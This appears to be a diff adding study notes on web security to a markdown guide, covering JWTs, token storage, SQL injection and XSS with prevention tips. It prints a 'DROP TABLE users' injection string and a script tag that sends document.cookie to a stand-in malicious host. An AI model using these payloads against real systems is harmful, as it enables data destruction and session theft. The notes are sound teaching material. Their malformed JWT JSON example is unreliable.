@@ -124,3 +124,124 @@ WebSockets commonly transmit data using lightweight JSON messages , here is a cl
 </details>
 
 ---
+
+### JWT
+
+JWT stands for *JSON Web Token*. It's a compact, secure string used to verify a user's identity after login or registration.
+After a successful login, the server creates a token using a **payload** (containing user data) and **signs** it with a secret key, typically using an algorithm like HMAC SHA256.
+The final token is sent to the browser, and used in future requests so the server knows who’s interacting without needing to log in again each time.
+
+<details>
+<summary><strong>Payload example</strong></summary>
+   
+```json
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+{
+  "userId": " 42 "
+   "alias": "Alice")"
+}
+```
+
+the server takes this payload (header and user data) , creates a signiture and applies it to the end of the token
+
+``` <encoded-header>.<encoded-payload>.<signature> ```
+
+</details>
+
+
+
+### 🧾 Token storage options
+##### Cookies
+- Login persist across sessions and browser refresh
+- Can be HTTPonly (secure flags) to reduce XSS risk
+- Auto sent with requests, ideal for backend validation
+- Or store in a session store (like Redis) tied to a cookie token
+##### Memory
+- (e.g. JS variable)	Temporary login, single session, lost on page reload
+- Simpler, useful for lightweight or temporary login
+
+Most teams use Node.js, Python, Go, or PHP for JWT-heavy work because of mature libraries and easy support for hashing, signing, and validation.
+
+---
+
+### 💉 SQL Injection
+
+SQL Injection is a type of attack where malicious users send crafted input that tricks your server into executing unintended database commands.
+Instead of behaving like simple form input, the attacker embeds **SQL commands** into the request, potentially altering or destroying data.
+
+### ⚠️ Example (Unsafe Query)
+<details>
+<summary><strong>unsafe query example</strong></summary>
+
+```sql
+SELECT * FROM users WHERE name = 'Alice';
+```
+An attacker might submit:
+
+```sql
+'Alice'; DROP TABLE users; --
+```
+
+This tunrs your query into
+```sql
+SELECT * FROM users WHERE name = 'Alice'; DROP TABLE users; --
+```
+
+🧨 Result: Your entire users table gets deleted, all accounts wiped.
+</details>
+
+### 🛡️ Typical Prevention
+- Use parameterized queries or prepared statements
+
+```sql
+SELECT * FROM users WHERE name = ?
+```
+- Never build SQL queries using raw user input
+- Sanitize and validate input server-side, especially for:
+   - Login forms
+   - Search fields
+   - Any user-controlled input that interacts with a database
+Backend protects by:
+
+---
+
+### 💉 XSS (Cross-Site Scripting)
+Cross-Site Scripting (XSS) is an attack where a user submits malicious content that gets rendered as executable code in someone else's browser.
+
+Often used to:
+- Steal cookies or session tokens
+- Trick users with fake login prompts
+- Break or deface UI content
+
+### ⚠️ Example (Injected Script)
+<details>
+<summary><strong>injected script example</strong></summary>
+   
+Attacker sends a chat message:
+```html
+<script>fetch('https://malicious.site/send?cookies=' + document.cookie)</script>
+```
+
+if this is displayed raw in frontend: 
+
+```html
+<div>User says: <script>...</script></div>
+```
+🧨 Result: The script runs in every viewer’s browser, sending their cookies to the attacker.
+
+</details>
+
+🛡️ Typical Prevention
+- Sanitize user content before displaying
+- Escape <, >, ", ', /, and other unsafe characters
+- Use text-safe render methods (e.g. textContent, not innerHTML)
+- Set Content Security Policy (CSP) headers to restrict which scripts can run
+- Avoid trusting input across chat, comments, forms, or aliases
+
+🧠 TL;DR If someone submits HTML, never render it raw. Treat user input like radioactive material until cleaned.
+
+---
